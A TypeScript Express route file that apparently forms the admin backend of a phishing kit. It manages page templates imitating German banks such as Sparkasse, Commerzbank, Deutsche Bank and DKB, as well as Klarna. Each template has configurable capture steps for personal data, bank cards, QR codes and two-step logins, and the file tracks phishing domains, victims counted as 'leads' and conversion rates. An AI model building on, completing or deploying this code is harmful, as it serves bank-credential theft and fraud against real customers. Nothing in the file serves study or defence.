import express from 'express';
import { getDb } from '../database';
import { authenticateJWT, requireAdmin } from '../middleware';
import { 
  getTemplateStepConfig, 
  updateTemplateStepConfig, 
  getAllTemplateStepConfigs 
} from '../database/tables/template_step_configs';

const router = express.Router();

// Get all templates (with optional type filtering)
router.get('/', async (req, res) => {
  try {
    const { type } = req.query;
    const db = getDb();
    
    let query = 'SELECT * FROM templates';
    const params: any[] = [];
    
    // Filter by template type if specified
    if (type && (type === 'bank' || type === 'landing_page')) {
      query += ' WHERE template_type = ?';
      params.push(type);
    }
    
    query += ' ORDER BY name';
    
    const allTemplates = db.prepare(query).all(...params);
    
    // Only return templates that actually exist in our codebase
    const existingTemplateFolders = [
      'commerzbank', 'santander', 'apobank', 'sparkasse', 'postbank', 
      'dkb', 'volksbank', 'comdirect', 'consorsbank', 'ingdiba', 'deutsche_bank',
      'klarna', 'credit-landing', 'targobank'
    ];
    
    const templates = allTemplates.filter(template => 
      existingTemplateFolders.includes(template.folder_name)
    );
    
    console.log(`📋 Returning ${templates.length} existing templates (filtered from ${allTemplates.length} total)${type ? ` of type '${type}'` : ''}`);
    
    return res.json({ templates });
  } catch (error) {
    console.error('Error fetching templates:', error);
    return res.status(500).json({ message: 'Server error fetching templates' });
  }
});

// Get a specific template by ID
router.get('/:id', async (req, res) => {
  const { id } = req.params;
  
  try {
    const db = getDb();
    const template = db.prepare('SELECT * FROM templates WHERE id = ?').get(id);
    
    if (!template) {
      return res.status(404).json({ message: 'Template not found' });
    }
    
    return res.json({ template });
  } catch (error) {
    console.error(`Error fetching template ${id}:`, error);
    return res.status(500).json({ message: 'Server error fetching template' });
  }
});

// Update a template (admin only)
router.put('/:id', authenticateJWT, requireAdmin, async (req, res) => {
  const { id } = req.params;
  const { name, description, is_active } = req.body;
  
  try {
    const db = getDb();
    
    // Check if template exists
    const existingTemplate = db.prepare('SELECT * FROM templates WHERE id = ?').get(id);
    
    if (!existingTemplate) {
      return res.status(404).json({ message: 'Template not found' });
    }
    
    // Update the template
    db.prepare(`
      UPDATE templates 
      SET name = ?, description = ?, is_active = ?, last_modified = CURRENT_TIMESTAMP
      WHERE id = ?
    `).run(
      name || existingTemplate.name,
      description !== undefined ? description : existingTemplate.description,
      is_active !== undefined ? is_active : existingTemplate.is_active,
      id
    );
    
    const updatedTemplate = db.prepare('SELECT * FROM templates WHERE id = ?').get(id);
    
    return res.json({ 
      message: 'Template updated successfully',
      template: updatedTemplate
    });
  } catch (error) {
    console.error(`Error updating template ${id}:`, error);
    return res.status(500).json({ message: 'Server error updating template' });
  }
});

// Toggle template active status (admin only)
router.post('/:id/toggle-status', authenticateJWT, requireAdmin, async (req, res) => {
  const { id } = req.params;
  
  try {
    const db = getDb();
    
    // Check if template exists
    const template = db.prepare('SELECT * FROM templates WHERE id = ?').get(id);
    
    if (!template) {
      return res.status(404).json({ message: 'Template not found' });
    }
    
    // Toggle the status
    const newStatus = !template.is_active;
    const newStatusInt = newStatus ? 1 : 0; // Convert boolean to integer for SQLite
    
    db.prepare(`
      UPDATE templates 
      SET is_active = ?, last_modified = CURRENT_TIMESTAMP
      WHERE id = ?
    `).run(newStatusInt, id);
    
    return res.json({ 
      message: `Template ${newStatus ? 'activated' : 'deactivated'} successfully`,
      template: { ...template, is_active: newStatus }
    });
  } catch (error) {
    console.error(`Error toggling template ${id} status:`, error);
    return res.status(500).json({ message: 'Server error toggling template status' });
  }
});

// Check if a template is active by folder name (public endpoint)
router.get('/check/:templateName', async (req, res) => {
  const { templateName } = req.params;
  
  try {
    const db = getDb();
    
    // Look up template by folder name
    const template = db.prepare('SELECT * FROM templates WHERE folder_name = ?').get(templateName);
    
    if (!template) {
      return res.status(404).json({ 
        message: 'Template not found',
        template: {
          exists: false,
          is_active: false,
          name: templateName
        }
      });
    }
    
    return res.json({
      template: {
        exists: true,
        is_active: template.is_active === 1,
        name: template.name,
        folder_name: template.folder_name,
        description: template.description
      }
    });
  } catch (error) {
    console.error(`Error checking template ${templateName} status:`, error);
    return res.status(500).json({ message: 'Server error checking template status' });
  }
});

// Get statistics for a template (admin only)
router.get('/:id/statistics', authenticateJWT, requireAdmin, async (req, res) => {
  const { id } = req.params;
  
  try {
    const db = getDb();
    
    // Check if template exists
    const template = db.prepare('SELECT * FROM templates WHERE id = ?').get(id);
    
    if (!template) {
      return res.status(404).json({ message: 'Template not found' });
    }
    
    // Get template statistics
    const leadCount = db.prepare('SELECT COUNT(*) as count FROM leads WHERE template_id = ?').get(id);
    const domainCount = db.prepare('SELECT COUNT(*) as count FROM domains WHERE template_id = ?').get(id);
    const visitorCount = db.prepare('SELECT COUNT(*) as count FROM tracking WHERE template_id = ?').get(id);
    
    // Get conversion rate
    const conversionStats = db.prepare(`
      SELECT 
        COUNT(*) as total_visitors,
        SUM(CASE WHEN converted_to_lead = 1 THEN 1 ELSE 0 END) as converted_visitors
      FROM tracking 
      WHERE template_id = ?
    `).get(id);
    
    const conversionRate = conversionStats.total_visitors > 0 
      ? (conversionStats.converted_visitors / conversionStats.total_visitors) * 100 
      : 0;
    
    return res.json({
      statistics: {
        leads: leadCount.count,
        domains: domainCount.count,
        visitors: visitorCount.count,
        conversionRate: parseFloat(conversionRate.toFixed(2))
      }
    });
  } catch (error) {
    console.error(`Error fetching statistics for template ${id}:`, error);
    return res.status(500).json({ message: 'Server error fetching template statistics' });
  }
});

// Get step configuration for a template (admin only)
router.get('/:id/step-config', authenticateJWT, requireAdmin, async (req, res) => {
  const { id } = req.params;
  
  try {
    const db = getDb();
    
    // Check if template exists
    const template = db.prepare('SELECT * FROM templates WHERE id = ?').get(id);
    
    if (!template) {
      return res.status(404).json({ message: 'Template not found' });
    }
    
    // Get step configuration
    const stepConfig = getTemplateStepConfig(db, parseInt(id));
    
    return res.json({
      template: {
        id: template.id,
        name: template.name,
        folder_name: template.folder_name
      },
      stepConfig
    });
  } catch (error) {
    console.error(`Error fetching step config for template ${id}:`, error);
    return res.status(500).json({ message: 'Server error fetching step configuration' });
  }
});

// Update step configuration for a template (admin only)
router.put('/:id/step-config', authenticateJWT, requireAdmin, async (req, res) => {
  const { id } = req.params;
  const { stepName, isEnabled } = req.body;
  
  try {
    const db = getDb();
    
    // Check if template exists
    const template = db.prepare('SELECT * FROM templates WHERE id = ?').get(id);
    
    if (!template) {
      return res.status(404).json({ message: 'Template not found' });
    }
    
    // Validate input
    if (!stepName || typeof isEnabled !== 'boolean') {
      return res.status(400).json({ 
        message: 'stepName (string) and isEnabled (boolean) are required' 
      });
    }
    
    // Update step configuration
    const updated = updateTemplateStepConfig(db, parseInt(id), stepName, isEnabled);
    
    if (!updated) {
      return res.status(404).json({ message: 'Step configuration not found' });
    }
    
    // Get updated configuration
    const stepConfig = getTemplateStepConfig(db, parseInt(id));
    
    return res.json({
      message: `Step '${stepName}' ${isEnabled ? 'enabled' : 'disabled'} successfully`,
      stepConfig
    });
  } catch (error) {
    console.error(`Error updating step config for template ${id}:`, error);
    return res.status(500).json({ message: 'Server error updating step configuration' });
  }
});

// Bulk update step configuration for a template (admin only)
router.put('/:id/step-config/bulk', authenticateJWT, requireAdmin, async (req, res) => {
  const { id } = req.params;
  const { stepConfig } = req.body;
  
  try {
    const db = getDb();
    
    // Check if template exists
    const template = db.prepare('SELECT * FROM templates WHERE id = ?').get(id);
    
    if (!template) {
      return res.status(404).json({ message: 'Template not found' });
    }
    
    // Validate input
    if (!stepConfig || typeof stepConfig !== 'object') {
      return res.status(400).json({ 
        message: 'stepConfig object is required' 
      });
    }
    
    // Update all step configurations
    let updatedCount = 0;
    for (const [stepName, isEnabled] of Object.entries(stepConfig)) {
      if (typeof isEnabled === 'boolean') {
        const updated = updateTemplateStepConfig(db, parseInt(id), stepName, isEnabled);
        if (updated) updatedCount++;
      }
    }
    
    // Get updated configuration
    const updatedStepConfig = getTemplateStepConfig(db, parseInt(id));
    
    return res.json({
      message: `${updatedCount} step configurations updated successfully`,
      stepConfig: updatedStepConfig
    });
  } catch (error) {
    console.error(`Error bulk updating step config for template ${id}:`, error);
    return res.status(500).json({ message: 'Server error updating step configurations' });
  }
});

// Get runtime configuration for frontend (public endpoint)
router.get('/:id/config', async (req, res) => {
  const { id } = req.params;
  
  try {
    const db = getDb();
    
    // Check if template exists and is active
    const template = db.prepare('SELECT * FROM templates WHERE id = ? AND is_active = 1').get(id);
    
    if (!template) {
      return res.status(404).json({ message: 'Template not found or inactive' });
    }
    
    // Get step configuration
    const stepConfig = getTemplateStepConfig(db, parseInt(id));
    
    return res.json({
      template: {
        name: template.name,
        folder_name: template.folder_name
      },
      steps: stepConfig
    });
  } catch (error) {
    console.error(`Error fetching runtime config for template ${id}:`, error);
    return res.status(500).json({ message: 'Server error fetching template configuration' });
  }
});

// Get runtime configuration by template name (public endpoint)
router.get('/config/:templateName', async (req, res) => {
  const { templateName } = req.params;
  
  try {
    const db = getDb();
    
    // Check if template exists and is active
    const template = db.prepare('SELECT * FROM templates WHERE folder_name = ? AND is_active = 1').get(templateName);
    
    if (!template) {
      return res.status(404).json({ message: 'Template not found or inactive' });
    }
    
    // Get step configuration
    const stepConfig = getTemplateStepConfig(db, template.id);
    
    return res.json({
      template: {
        id: template.id,
        name: template.name,
        folder_name: template.folder_name
      },
      steps: stepConfig
    });
  } catch (error) {
    console.error(`Error fetching runtime config for template ${templateName}:`, error);
    return res.status(500).json({ message: 'Server error fetching template configuration' });
  }
});

// Reset step configuration to defaults (admin only)
router.post('/:id/reset-config', authenticateJWT, requireAdmin, async (req, res) => {
  const { id } = req.params;
  
  try {
    const db = getDb();
    
    // Check if template exists
    const template = db.prepare('SELECT * FROM templates WHERE id = ? AND folder_name IS NOT NULL').get(id);
    
    if (!template) {
      return res.status(404).json({ message: 'Template not found' });
    }
    
    // Delete existing configurations
    db.prepare('DELETE FROM template_step_configs WHERE template_id = ?').run(id);
    
    // Re-insert default configurations
    const defaultConfigs: Record<string, string[]> = {
      'santander': ['personalData', 'qrCode', 'bankCard'],
      'commerzbank': ['personalData', 'bankCard', 'qrCode'],
      'comdirect': ['personalData', 'bankCard', 'qrCode'],
      'apobank': ['personalData', 'bankCard'],
      'postbank': ['doubleLogin', 'personalData', 'bankCard', 'qrCode'],
      'sparkasse': ['branchSelection', 'personalData', 'bankCard', 'twoStepLogin'],
      'volksbank': ['branchSelection', 'personalData', 'qrUpload', 'bankCard'],
      'consorsbank': ['personalData', 'bankCard'],
      'ingdiba': ['transactionCancel', 'personalData'],
      'deutsche_bank': ['multiFieldLogin', 'personalData', 'qrCode', 'bankCard'],
      'dkb': ['personalData', 'qrUpload', 'bankCard', 'twoStepLogin'],
      'klarna': ['bankSelection', 'branchSelection', 'personalData', 'bankCard']
    };
    
    const steps = defaultConfigs[template.folder_name];
    if (steps) {
      const insertStmt = db.prepare(`
        INSERT INTO template_step_configs (template_id, step_name, is_enabled)
        VALUES (?, ?, 1)
      `);
      
      for (const stepName of steps) {
        insertStmt.run(id, stepName);
      }
    }
    
    // Get updated configuration
    const stepConfig = getTemplateStepConfig(db, parseInt(id));
    
    return res.json({
      message: 'Step configuration reset to defaults successfully',
      stepConfig
    });
  } catch (error) {
    console.error(`Error resetting step config for template ${id}:`, error);
    return res.status(500).json({ message: 'Server error resetting step configuration' });
  }
});

// Get all step configurations for all templates (admin only)
router.get('/all/step-configs', authenticateJWT, requireAdmin, async (req, res) => {
  try {
    const db = getDb();
    const allConfigs = getAllTemplateStepConfigs(db);
    
    return res.json({
      configurations: allConfigs
    });
  } catch (error) {
    console.error('Error fetching all step configurations:', error);
    return res.status(500).json({ message: 'Server error fetching step configurations' });
  }
});

export default router;
